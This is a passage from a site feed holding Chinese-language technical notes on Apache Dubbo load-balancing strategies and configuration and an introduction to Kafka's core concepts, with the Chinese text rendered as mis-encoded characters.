<li>ç¬¬å…­å±‚ï¼š<strong>monitorå±‚</strong>ï¼Œç›‘æ§å±‚ï¼Œå¯¹rpcæ¥å£çš„è°ƒç”¨æ¬¡æ•°å’Œè°ƒç”¨æ—¶é—´è¿›è¡Œç›‘æ§</li>
<li>ç¬¬ä¸ƒå±‚ï¼š<strong>protocolå±‚</strong>ï¼Œè¿œç¨‹è°ƒç”¨å±‚ï¼Œå°è£…rpcè°ƒç”¨</li>
<li>ç¬¬å…«å±‚ï¼š<strong>exchangeå±‚</strong>ï¼Œä¿¡æ¯äº¤æ¢å±‚ï¼Œå°è£…è¯·æ±‚å“åº”æ¨¡å¼ï¼ŒåŒæ­¥è½¬å¼‚æ­¥</li>
<li>ç¬¬ä¹å±‚ï¼š<strong>transportå±‚</strong>ï¼Œç½‘ç»œä¼ è¾“å±‚ï¼ŒæŠ½è±¡minaå’Œnettyä¸ºç»Ÿä¸€æ¥å£</li>
<li>ç¬¬åå±‚ï¼š<strong>serializeå±‚</strong>ï¼Œæ•°æ®åºåˆ—åŒ–å±‚ï¼Œç½‘ç»œä¼ è¾“éœ€è¦</li>
</ul>
<h1 id="dubbo-çš„ä½¿ç”¨" tabindex="-1"> Dubbo çš„ä½¿ç”¨</h1>
<p><a href="http://dubbo.apache.org/zh-cn" target="_blank" rel="noopener noreferrer">Dubbo ä¸­æ–‡æ‰‹å†Œ</a></p>
<h2 id="dubbo-çš„æ³¨å†Œä¸­å¿ƒ" tabindex="-1"> Dubbo çš„æ³¨å†Œä¸­å¿ƒ</h2>
<ul>
<li><strong>Zookeeper</strong> æ³¨å†Œä¸­å¿ƒ(æ¨èä½¿ç”¨)
<ul>
<li>ä¼˜ç‚¹:æ”¯æŒç½‘ç»œé›†ç¾¤</li>
<li>ç¼ºç‚¹:ç¨³å®šæ€§å—é™äºZookeeper</li>
</ul>
</li>
<li>Redis æ³¨å†Œä¸­å¿ƒ
<ul>
<li>ä¼˜ç‚¹:æ€§èƒ½é«˜</li>
<li>ç¼ºç‚¹:å¯¹æœåŠ¡å™¨ç¯å¢ƒè¦æ±‚è¾ƒé«˜</li>
</ul>
</li>
<li>Multicast æ³¨å†Œä¸­å¿ƒ
<ul>
<li>ä¼˜ç‚¹:é¢ä¸­å¿ƒåŒ–,ä¸éœ€è¦é¢å¤–å®‰è£…è½¯ä»¶</li>
<li>ç¼ºç‚¹:å»ºè®®åŒæœºæˆ¿(å±€åŸŸç½‘)å†…ä½¿ç”¨</li>
</ul>
</li>
<li>Simple æ³¨å†Œä¸­å¿ƒ
<ul>
<li>é€‚ç”¨äºæµ‹è¯•ç¯å¢ƒ.ä¸æ”¯æŒé›†ç¾¤</li>
</ul>
</li>
</ul>
<h2 id="dubbo-çš„è´Ÿè½½å‡è¡¡" tabindex="-1"> Dubbo çš„è´Ÿè½½å‡è¡¡</h2>
<h3 id="è´Ÿè½½å‡è¡¡" tabindex="-1"> è´Ÿè½½å‡è¡¡</h3>
<blockquote>
<p>ç»´åŸºç™¾ç§‘å¯¹è´Ÿè½½å‡è¡¡çš„å®šä¹‰ï¼šè´Ÿè½½å‡è¡¡æ”¹å–„äº†è·¨å¤šä¸ªè®¡ç®—èµ„æºï¼ˆä¾‹å¦‚è®¡ç®—æœºï¼Œè®¡ç®—æœºé›†ç¾¤ï¼Œç½‘ç»œé“¾æ¥ï¼Œä¸­å¤®å¤„ç†å•å…ƒæˆ–ç£ç›˜é©±åŠ¨çš„çš„å·¥ä½œè´Ÿè½½åˆ†å¸ƒã€‚è´Ÿè½½å¹³è¡¡æ—¨åœ¨ä¼˜åŒ–èµ„æºä½¿ç”¨ï¼Œæœ€å¤§åŒ–ååé‡ï¼Œæœ€å°åŒ–å“åº”æ—¶é—´ï¼Œå¹¶é¿å…ä»»ä½•å•ä¸ªèµ„æºçš„è¿‡è½½ã€‚ä½¿ç”¨å…·æœ‰è´Ÿè½½å¹³è¡¡è€Œä¸æ˜¯å•ä¸ªç»„ä»¶çš„å¤šä¸ªç»„ä»¶å¯ä»¥é€šè¿‡å†—ä½™æé«˜å¯é æ€§å’Œå¯ç”¨æ€§ã€‚è´Ÿè½½å¹³è¡¡é€šå¸¸æ¶‰åŠä¸“ç”¨è½¯ä»¶æˆ–ç¡¬ä»¶ã€‚</p>
</blockquote>
<p><strong>ç”¨é€šä¿—çš„è¯è¯´</strong></p>
<p>æ¯”å¦‚æˆ‘ä»¬çš„ç³»ç»Ÿä¸­çš„æŸä¸ªæœåŠ¡çš„è®¿é—®é‡ç‰¹åˆ«å¤§ï¼Œæˆ‘ä»¬å°†è¿™ä¸ªæœåŠ¡éƒ¨ç½²åœ¨äº†å¤šå°æœåŠ¡å™¨ä¸Šï¼Œå½“å®¢æˆ·ç«¯å‘èµ·è¯·æ±‚çš„æ—¶å€™ï¼Œå¤šå°æœåŠ¡å™¨éƒ½å¯ä»¥å¤„ç†è¿™ä¸ªè¯·æ±‚ã€‚é‚£ä¹ˆï¼Œå¦‚ä½•æ­£ç¡®é€‰æ‹©å¤„ç†è¯¥è¯·æ±‚çš„æœåŠ¡å™¨å°±å¾ˆå…³é”®ã€‚å‡å¦‚ï¼Œä½ å°±è¦ä¸€å°æœåŠ¡å™¨æ¥å¤„ç†è¯¥æœåŠ¡çš„è¯·æ±‚ï¼Œé‚£è¯¥æœåŠ¡éƒ¨ç½²åœ¨å¤šå°æœåŠ¡å™¨çš„æ„ä¹‰å°±ä¸å¤å­˜åœ¨äº†ã€‚è´Ÿè½½å‡è¡¡å°±æ˜¯ä¸ºäº†é¿å…å•ä¸ªæœåŠ¡å™¨å“åº”åŒä¸€è¯·æ±‚ï¼Œå®¹æ˜“é€ æˆæœåŠ¡å™¨å®•æœºã€å´©æºƒç­‰é—®é¢˜ï¼Œæˆ‘ä»¬ä»è´Ÿè½½å‡è¡¡çš„è¿™å››ä¸ªå­—å°±èƒ½æ˜æ˜¾æ„Ÿå—åˆ°å®ƒçš„æ„ä¹‰ã€‚</p>
<h3 id="dubbo-çš„è´Ÿè½½å‡è¡¡ç­–ç•¥" tabindex="-1"> Dubbo çš„è´Ÿè½½å‡è¡¡ç­–ç•¥</h3>
<p>åœ¨é›†ç¾¤è´Ÿè½½å‡è¡¡æ—¶ï¼ŒDubbo æä¾›äº†å¤šç§å‡è¡¡ç­–ç•¥ï¼Œé»˜è®¤ä¸º <code>random</code> éšæœºè°ƒç”¨ã€‚å¯ä»¥è‡ªè¡Œæ‰©å±•è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œå‚è§ï¼š<a href="https://dubbo.gitbooks.io/dubbo-dev-book/content/impls/load-balance.html" target="_blank" rel="noopener noreferrer">è´Ÿè½½å‡è¡¡æ‰©å±•</a>ã€‚</p>
<h4 id="random-loadbalance" tabindex="-1"> Random LoadBalance</h4>
<p><strong>åŸºäºæƒé‡çš„éšæœºè´Ÿè½½å‡è¡¡æœºåˆ¶</strong>(é»˜è®¤)</p>
<ul>
<li><strong>éšæœºï¼ŒæŒ‰æƒé‡è®¾ç½®éšæœºæ¦‚ç‡ã€‚</strong></li>
<li>åœ¨ä¸€ä¸ªæˆªé¢ä¸Šç¢°æ’çš„æ¦‚ç‡é«˜ï¼Œä½†è°ƒç”¨é‡è¶Šå¤§åˆ†å¸ƒè¶Šå‡åŒ€ï¼Œè€Œä¸”æŒ‰æ¦‚ç‡ä½¿ç”¨æƒé‡åä¹Ÿæ¯”è¾ƒå‡åŒ€ï¼Œæœ‰åˆ©äºåŠ¨æ€è°ƒæ•´æä¾›è€…æƒé‡ã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo-Random-LoadBalance.png" alt="åŸºäºæƒé‡çš„éšæœºè´Ÿè½½å‡è¡¡æœºåˆ¶" loading="lazy"></p>
<h4 id="roundrobin-loadbalance" tabindex="-1"> RoundRobin LoadBalance</h4>
<p><strong>åŸºäºæƒé‡çš„è½®è¯¢è´Ÿè½½å‡è¡¡æœºåˆ¶</strong>(ä¸æ¨è)</p>
<ul>
<li>è½®å¾ªï¼ŒæŒ‰å…¬çº¦åçš„æƒé‡è®¾ç½®è½®å¾ªæ¯”ç‡ã€‚</li>
<li>å­˜åœ¨æ…¢çš„æä¾›è€…ç´¯ç§¯è¯·æ±‚çš„é—®é¢˜ï¼Œæ¯”å¦‚ï¼šç¬¬äºŒå°æœºå™¨å¾ˆæ…¢ï¼Œä½†æ²¡æŒ‚ï¼Œå½“è¯·æ±‚è°ƒåˆ°ç¬¬äºŒå°æ—¶å°±å¡åœ¨é‚£ï¼Œä¹…è€Œä¹…ä¹‹ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½å¡åœ¨è°ƒåˆ°ç¬¬äºŒå°ä¸Šã€‚</li>
</ul>
<p><img src="@source/assets/cs-note/framework/dubbo/Dubbo-RoundRobin-LoadBalance.png" alt="åŸºäºæƒé‡çš„è½®è¯¢è´Ÿè½½å‡è¡¡æœºåˆ¶" loading="lazy"></p>
<h4 id="leastactive-loadbalance" tabindex="-1"> LeastActive LoadBalance</h4>
<ul>
<li>æœ€å°‘æ´»è·ƒè°ƒç”¨æ•°ï¼Œç›¸åŒæ´»è·ƒæ•°çš„éšæœºï¼Œæ´»è·ƒæ•°æŒ‡è°ƒç”¨å‰åè®¡æ•°å·®ã€‚</li>
<li>ä½¿æ…¢çš„æä¾›è€…æ”¶åˆ°æ›´å°‘è¯·æ±‚ï¼Œå› ä¸ºè¶Šæ…¢çš„æä¾›è€…çš„è°ƒç”¨å‰åè®¡æ•°å·®ä¼šè¶Šå¤§ã€‚</li>
</ul>
<h4 id="consistenthash-loadbalance" tabindex="-1"> ConsistentHash LoadBalance</h4>
<p><strong>ä¸€è‡´æ€§ Hashï¼Œç›¸åŒå‚æ•°çš„è¯·æ±‚æ€»æ˜¯å‘åˆ°åŒä¸€æä¾›è€…ã€‚(å¦‚æœéœ€è¦çš„ä¸æ˜¯éšæœºè´Ÿè½½å‡è¡¡ï¼Œæ˜¯è¦ä¸€ç±»è¯·æ±‚éƒ½åˆ°ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£å°±èµ°è¿™ä¸ªä¸€è‡´æ€§hashç­–ç•¥ã€‚)</strong></p>
<ul>
<li>å½“æŸä¸€å°æä¾›è€…æŒ‚æ—¶ï¼ŒåŸæœ¬å‘å¾€è¯¥æä¾›è€…çš„è¯·æ±‚ï¼ŒåŸºäºè™šæ‹ŸèŠ‚ç‚¹ï¼Œå¹³æ‘Šåˆ°å…¶å®ƒæä¾›è€…ï¼Œä¸ä¼šå¼•èµ·å‰§çƒˆå˜åŠ¨ã€‚</li>
<li>ç®—æ³•å‚è§ï¼šhttp://en.wikipedia.org/wiki/Consistent_hashing</li>
<li>ç¼ºçœåªå¯¹ç¬¬ä¸€ä¸ªå‚æ•° Hashï¼Œå¦‚æœè¦ä¿®æ”¹ï¼Œè¯·é…ç½® <code>&lt;dubbo:parameter key=&quot;hash.arguments&quot; value=&quot;0,1&quot; /&gt;</code></li>
<li>ç¼ºçœç”¨ 160 ä»½è™šæ‹ŸèŠ‚ç‚¹ï¼Œå¦‚æœè¦ä¿®æ”¹ï¼Œè¯·é…ç½® <code>&lt;dubbo:parameter key=&quot;hash.nodes&quot; value=&quot;320&quot; /&gt;</code></li>
</ul>
<h3 id="é…ç½®æ–¹å¼" tabindex="-1"> é…ç½®æ–¹å¼</h3>
<p><strong>xml é…ç½®æ–¹å¼</strong></p>
<p>æœåŠ¡ç«¯æœåŠ¡çº§åˆ«</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>service <span>interface</span><span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span> <span>/</span><span>></span>
</code></pre></div><p>å®¢æˆ·ç«¯æœåŠ¡çº§åˆ«</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>reference <span>interface</span><span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span> <span>/</span><span>></span>
</code></pre></div><p>æœåŠ¡ç«¯æ–¹æ³•çº§åˆ«</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>service <span>interface</span><span>=</span><span>"..."</span><span>></span>
    <span>&lt;</span>dubbo<span>:</span>method name<span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span><span>/</span><span>></span>
<span>&lt;</span><span>/</span>dubbo<span>:</span>service<span>></span>
</code></pre></div><p>å®¢æˆ·ç«¯æ–¹æ³•çº§åˆ«</p>
<div><pre><code><span>&lt;</span>dubbo<span>:</span>reference <span>interface</span><span>=</span><span>"..."</span><span>></span>
    <span>&lt;</span>dubbo<span>:</span>method name<span>=</span><span>"..."</span> loadbalance<span>=</span><span>"roundrobin"</span><span>/</span><span>></span>
<span>&lt;</span><span>/</span>dubbo<span>:</span>reference<span>></span>
</code></pre></div><p><strong>æ³¨è§£é…ç½®æ–¹å¼ï¼š</strong></p>
<p>æ¶ˆè´¹æ–¹åŸºäºåŸºäºæ³¨è§£çš„æœåŠ¡çº§åˆ«é…ç½®æ–¹å¼ï¼š</p>
<div><pre><code><span>@Reference</span><span>(</span>loadbalance <span>=</span> <span>"roundrobin"</span><span>)</span>
<span>HelloService</span> helloService<span>;</span>
</code></pre></div>]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">Kafka ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Kafka.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%A1%86%E6%9E%B6/Kafka.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
</ul>

<h1 id="kafka-ä»‹ç»" tabindex="-1"> Kafka ä»‹ç»</h1>
<h2 id="kafka-ç®€ä»‹" tabindex="-1"> Kafka ç®€ä»‹</h2>
<p><strong>Kafka æ˜¯ä¸€ç§åˆ†å¸ƒå¼çš„ï¼ŒåŸºäºå‘å¸ƒ / è®¢é˜…çš„æ¶ˆæ¯ç³»ç»Ÿã€‚</strong></p>
<p>ä¸»è¦è®¾è®¡ç›®æ ‡å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä»¥æ—¶é—´å¤æ‚åº¦ä¸º O(1) çš„æ–¹å¼æä¾›æ¶ˆæ¯æŒä¹…åŒ–èƒ½åŠ›ï¼Œå³ä½¿å¯¹ TB çº§ä»¥ä¸Šæ•°æ®ä¹Ÿèƒ½ä¿è¯å¸¸æ•°æ—¶é—´å¤æ‚åº¦çš„è®¿é—®æ€§èƒ½ã€‚</li>
<li>é«˜ååç‡ã€‚å³ä½¿åœ¨éå¸¸å»‰ä»·çš„å•†ç”¨æœºå™¨ä¸Šä¹Ÿèƒ½åšåˆ°å•æœºæ”¯æŒæ¯ç§’ 100K æ¡ä»¥ä¸Šæ¶ˆæ¯çš„ä¼ è¾“ã€‚</li>
<li>æ”¯æŒ Kafka Server é—´çš„æ¶ˆæ¯åˆ†åŒºï¼ŒåŠåˆ†å¸ƒå¼æ¶ˆè´¹ï¼ŒåŒæ—¶ä¿è¯æ¯ä¸ª Partition å†…çš„æ¶ˆæ¯é¡ºåºä¼ è¾“ã€‚</li>
<li>åŒæ—¶æ”¯æŒç¦»çº¿æ•°æ®å¤„ç†å’Œå®æ—¶æ•°æ®å¤„ç†ã€‚</li>
<li>Scale outï¼šæ”¯æŒåœ¨çº¿æ°´å¹³æ‰©å±•ã€‚</li>
</ul>
<h2 id="kafka-æ ¸å¿ƒæ¦‚å¿µ" tabindex="-1"> Kafka æ ¸å¿ƒæ¦‚å¿µ</h2>
<h3 id="ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…" tabindex="-1"> ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…</h3>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€….png" alt="ç”Ÿäº§è€…ä¸æ¶ˆè´¹è€…" loading="lazy"></p>
<p>å¯¹äº Kafka æ¥è¯´å®¢æˆ·ç«¯æœ‰ä¸¤ç§åŸºæœ¬ç±»å‹ï¼š</p>
<ol>
<li><strong>ç”Ÿäº§è€…ï¼ˆProducerï¼‰</strong></li>
<li><strong>æ¶ˆè´¹è€…ï¼ˆConsumerï¼‰</strong></li>
</ol>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ç”¨æ¥åšæ•°æ®é›†æˆçš„ Kafka Connect API å’Œæµå¼å¤„ç†çš„ Kafka Streams ç­‰é«˜é˜¶å®¢æˆ·ç«¯ï¼Œä½†è¿™äº›é«˜é˜¶å®¢æˆ·ç«¯åº•å±‚ä»ç„¶æ˜¯ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…APIï¼Œå®ƒä»¬åªä¸è¿‡æ˜¯åœ¨ä¸Šå±‚åšäº†å°è£…ã€‚</p>
<p>ç”Ÿäº§è€…ï¼ˆä¹Ÿç§°ä¸ºå‘å¸ƒè€…ï¼‰åˆ›å»ºæ¶ˆæ¯ï¼Œè€Œæ¶ˆè´¹è€…ï¼ˆä¹Ÿç§°ä¸ºè®¢é˜…è€…ï¼‰è´Ÿè´£è®¢é˜…å’Œæ¶ˆè´¹æ¶ˆæ¯ã€‚</p>
<p><strong>Consumer Group</strong>ï¼šåŒä¸€ä¸ªConsumer Groupä¸­çš„Consumersï¼ŒKafkaå°†ç›¸åº”Topicä¸­çš„æ¯ä¸ªæ¶ˆæ¯åªå‘é€ç»™å…¶ä¸­ä¸€ä¸ªConsumerï¼›æ¶ˆè´¹è€…ç”¨consumerGroupæ¥æ ‡è¯†è‡ªå·±ã€‚åŒä¸€ä¸ªæ¶ˆè´¹ç»„å¯ä»¥å¹¶å‘åœ°æ¶ˆè´¹å¤šä¸ªåˆ†åŒºçš„æ¶ˆæ¯ï¼ŒåŒä¸€ä¸ªpartitionä¹Ÿå¯ä»¥ç”±å¤šä¸ªconsumerGroupå¹¶å‘æ¶ˆè´¹ï¼Œä½†æ˜¯åœ¨consumerGroupä¸­ä¸€ä¸ªpartitionåªèƒ½ç”±ä¸€ä¸ªconsumeræ¶ˆè´¹ã€‚</p>
<h3 id="ä¸»é¢˜-topic-å’Œ-åˆ†åŒº-partition" tabindex="-1"> ä¸»é¢˜(Topic) å’Œ åˆ†åŒº(Partition)</h3>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-ä¸»é¢˜ä¸åˆ†åŒº.png" alt="ä¸»é¢˜ï¼ˆTopicï¼‰ä¸åˆ†åŒºï¼ˆPartitionï¼‰" loading="lazy"></p>
<p>åœ¨ Kafka ä¸­ï¼Œæ¶ˆæ¯ä»¥**ä¸»é¢˜ï¼ˆTopicï¼‰**æ¥åˆ†ç±»ï¼Œæ¯ä¸€ä¸ªä¸»é¢˜éƒ½å¯¹åº”ä¸€ä¸ª <strong>ã€Œæ¶ˆæ¯é˜Ÿåˆ—ã€</strong>ï¼Œè¿™æœ‰ç‚¹å„¿ç±»ä¼¼äºæ•°æ®åº“ä¸­çš„è¡¨ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬æŠŠæ‰€æœ‰åŒç±»çš„æ¶ˆæ¯éƒ½å¡å…¥åˆ°ä¸€ä¸ªâ€œä¸­å¿ƒâ€é˜Ÿåˆ—ä¸­ï¼ŒåŠ¿å¿…ç¼ºå°‘å¯ä¼¸ç¼©æ€§ï¼Œæ— è®ºæ˜¯ç”Ÿäº§è€…/æ¶ˆè´¹è€…æ•°ç›®çš„å¢åŠ ï¼Œè¿˜æ˜¯æ¶ˆæ¯æ•°é‡çš„å¢åŠ ï¼Œéƒ½å¯èƒ½è€—å°½ç³»ç»Ÿçš„æ€§èƒ½æˆ–å­˜å‚¨ã€‚</p>
<p>æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªç”Ÿæ´»ä¸­çš„ä¾‹å­æ¥è¯´æ˜ï¼šç°åœ¨ A åŸå¸‚ç”Ÿäº§çš„æŸå•†å“éœ€è¦è¿è¾“åˆ° B åŸå¸‚ï¼Œèµ°çš„æ˜¯å…¬è·¯ï¼Œé‚£ä¹ˆå•é€šé“çš„é«˜é€Ÿå…¬è·¯ä¸è®ºæ˜¯åœ¨ã€ŒA åŸå¸‚å•†å“å¢å¤šã€è¿˜æ˜¯ã€Œç°åœ¨ C åŸå¸‚ä¹Ÿè¦å¾€ B åŸå¸‚è¿è¾“ä¸œè¥¿ã€è¿™æ ·çš„æƒ…å†µä¸‹éƒ½ä¼šå‡ºç°ã€Œååé‡ä¸è¶³ã€çš„é—®é¢˜ã€‚æ‰€ä»¥æˆ‘ä»¬ç°åœ¨å¼•å…¥**åˆ†åŒºï¼ˆPartitionï¼‰**çš„æ¦‚å¿µï¼Œç±»ä¼¼â€œå…è®¸å¤šä¿®å‡ æ¡é“â€çš„æ–¹å¼å¯¹æˆ‘ä»¬çš„ä¸»é¢˜å®Œæˆäº†æ°´å¹³æ‰©å±•ã€‚</p>
<p>æ¶ˆæ¯çš„ä¸»é¢˜ã€é˜Ÿåˆ—ï¼Œæ¯ä¸€ä¸ªæ¶ˆæ¯éƒ½æœ‰å®ƒçš„topicï¼ŒKafkaé€šè¿‡topicå¯¹æ¶ˆæ¯è¿›è¡Œå½’ç±»ã€‚Kafkaä¸­å¯ä»¥å°†Topicä»ç‰©ç†ä¸Šåˆ’åˆ†æˆä¸€ä¸ªæˆ–å¤šä¸ªåˆ†åŒºï¼ˆPartitionï¼‰ï¼Œæ¯ä¸ªåˆ†åŒºåœ¨ç‰©ç†ä¸Šå¯¹åº”ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œä»¥â€œtopicName_partitionIndexâ€çš„å‘½åæ–¹å¼å‘½åï¼Œè¯¥ç›®å½•åŒ…å«äº†è¿™ä¸ªåˆ†åŒºçš„æ‰€æœ‰æ¶ˆæ¯(.log)å’Œç´¢å¼•æ–‡ä»¶(.index)ï¼Œè¿™ä½¿å¾—Kafkaçš„ååç‡å¯ä»¥æ°´å¹³æ‰©å±•ã€‚</p>
<h3 id="broker-å’Œ-cluster" tabindex="-1"> Broker å’Œ Cluster</h3>
<p>ä¸€ä¸ª Kafka æœåŠ¡å™¨ä¹Ÿç§°ä¸º Brokerï¼Œå®ƒæ¥å—ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯å¹¶å­˜å…¥ç£ç›˜ï¼›Broker åŒæ—¶æœåŠ¡æ¶ˆè´¹è€…æ‹‰å–åˆ†åŒºæ¶ˆæ¯çš„è¯·æ±‚ï¼Œè¿”å›ç›®å‰å·²ç»æäº¤çš„æ¶ˆæ¯ã€‚ä½¿ç”¨ç‰¹å®šçš„æœºå™¨ç¡¬ä»¶ï¼Œä¸€ä¸ª Broker æ¯ç§’å¯ä»¥å¤„ç†æˆåƒä¸Šä¸‡çš„åˆ†åŒºå’Œç™¾ä¸‡é‡çº§çš„æ¶ˆæ¯ã€‚</p>
<p>è‹¥å¹²ä¸ª Broker ç»„æˆä¸€ä¸ªé›†ç¾¤ï¼ˆClusterï¼‰ï¼Œå…¶ä¸­é›†ç¾¤å†…æŸä¸ª Broker ä¼šæˆä¸ºé›†ç¾¤æ§åˆ¶å™¨ï¼ˆCluster Controllerï¼‰ï¼Œå®ƒè´Ÿè´£ç®¡ç†é›†ç¾¤ï¼ŒåŒ…æ‹¬åˆ†é…åˆ†åŒºåˆ° Brokerã€ç›‘æ§ Broker æ•…éšœç­‰ã€‚åœ¨é›†ç¾¤å†…ï¼Œä¸€ä¸ªåˆ†åŒºç”±ä¸€ä¸ª Broker è´Ÿè´£ï¼Œè¿™ä¸ª Broker ä¹Ÿç§°ä¸ºè¿™ä¸ªåˆ†åŒºçš„ Leaderï¼›å½“ç„¶ä¸€ä¸ªåˆ†åŒºå¯ä»¥è¢«å¤åˆ¶åˆ°å¤šä¸ª Broker ä¸Šæ¥å®ç°å†—ä½™ï¼Œè¿™æ ·å½“å­˜åœ¨ Broker æ•…éšœæ—¶å¯ä»¥å°†å…¶åˆ†åŒºé‡æ–°åˆ†é…åˆ°å…¶ä»– Broker æ¥è´Ÿè´£ã€‚ä¸‹å›¾æ˜¯ä¸€ä¸ªæ ·ä¾‹ï¼š</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafka-Brokerå’Œé›†ç¾¤.png" alt="Brokerå’Œé›†ç¾¤" loading="lazy"></p>
<p>Kafka çš„ä¸€ä¸ªå…³é”®æ€§è´¨æ˜¯æ—¥å¿—ä¿ç•™ï¼ˆretentionï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é…ç½®ä¸»é¢˜çš„æ¶ˆæ¯ä¿ç•™ç­–ç•¥ï¼Œè­¬å¦‚åªä¿ç•™ä¸€æ®µæ—¶é—´çš„æ—¥å¿—æˆ–è€…åªä¿ç•™ç‰¹å®šå¤§å°çš„æ—¥å¿—ã€‚å½“è¶…è¿‡è¿™äº›é™åˆ¶æ—¶ï¼Œè€çš„æ¶ˆæ¯ä¼šè¢«åˆ é™¤ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é’ˆå¯¹æŸä¸ªä¸»é¢˜å•ç‹¬è®¾ç½®æ¶ˆæ¯è¿‡æœŸç­–ç•¥ï¼Œè¿™æ ·å¯¹äºä¸åŒåº”ç”¨å¯ä»¥å®ç°ä¸ªæ€§åŒ–ã€‚</p>
<h3 id="å¤šé›†ç¾¤" tabindex="-1"> å¤šé›†ç¾¤</h3>
<p>éšç€ä¸šåŠ¡å‘å±•ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦å¤šé›†ç¾¤ï¼Œé€šå¸¸å¤„äºä¸‹é¢å‡ ä¸ªåŸå› ï¼š</p>
<ul>
<li>åŸºäºæ•°æ®çš„éš”ç¦»ï¼›</li>
<li>åŸºäºå®‰å…¨çš„éš”ç¦»ï¼›</li>
<li>å¤šæ•°æ®ä¸­å¿ƒï¼ˆå®¹ç¾ï¼‰</li>
</ul>
<p>å½“æ„å»ºå¤šä¸ªæ•°æ®ä¸­å¿ƒæ—¶ï¼Œå¾€å¾€éœ€è¦å®ç°æ¶ˆæ¯äº’é€šã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚ç”¨æˆ·ä¿®æ”¹äº†ä¸ªäººèµ„æ–™ï¼Œé‚£ä¹ˆåç»­çš„è¯·æ±‚æ— è®ºè¢«å“ªä¸ªæ•°æ®ä¸­å¿ƒå¤„ç†ï¼Œè¿™ä¸ªæ›´æ–°éœ€è¦åæ˜ å‡ºæ¥ã€‚åˆæˆ–è€…ï¼Œå¤šä¸ªæ•°æ®ä¸­å¿ƒçš„æ•°æ®éœ€è¦æ±‡æ€»åˆ°ä¸€ä¸ªæ€»æ§ä¸­å¿ƒæ¥åšæ•°æ®åˆ†æã€‚</p>
<p>ä¸Šé¢è¯´çš„åˆ†åŒºå¤åˆ¶å†—ä½™æœºåˆ¶åªé€‚ç”¨äºåŒä¸€ä¸ª Kafka é›†ç¾¤å†…éƒ¨ï¼Œå¯¹äºå¤šä¸ª Kafka é›†ç¾¤æ¶ˆæ¯åŒæ­¥å¯ä»¥ä½¿ç”¨ Kafka æä¾›çš„ MirrorMaker å·¥å…·ã€‚æœ¬è´¨ä¸Šæ¥è¯´ï¼ŒMirrorMaker åªæ˜¯ä¸€ä¸ª Kafka æ¶ˆè´¹è€…å’Œç”Ÿäº§è€…ï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªé˜Ÿåˆ—è¿æ¥èµ·æ¥è€Œå·²ã€‚å®ƒä»ä¸€ä¸ªé›†ç¾¤ä¸­æ¶ˆè´¹æ¶ˆæ¯ï¼Œç„¶åå¾€å¦ä¸€ä¸ªé›†ç¾¤ç”Ÿäº§æ¶ˆæ¯ã€‚</p>
<h1 id="kafka-è®¾è®¡ä¸å®ç°" tabindex="-1"> Kafka è®¾è®¡ä¸å®ç°</h1>
<h2 id="kafka-æ¶æ„" tabindex="-1"> Kafka æ¶æ„</h2>
<p>èƒ½å¤Ÿå‘å¸ƒå’Œè®¢é˜…æ¶ˆæ¯æµï¼ˆç±»ä¼¼äºæ¶ˆæ¯é˜Ÿåˆ—ï¼‰ ä»¥å®¹é”™çš„ã€æŒä¹…çš„æ–¹å¼å­˜å‚¨æ¶ˆæ¯æµ å¤šåˆ†åŒºæ¦‚å¿µï¼Œæé«˜äº†å¹¶è¡Œèƒ½åŠ›</p>
<p><img src="@source/assets/cs-note/framework/message-queue/kafkaæ¶æ„.png" alt="" loading="lazy"></p>
<h2 id="kafka-æ–‡ä»¶ç³»ç»Ÿä½œä¸ºå­˜å‚¨" tabindex="-1"> Kafka æ–‡ä»¶ç³»ç»Ÿä½œä¸ºå­˜å‚¨</h2>
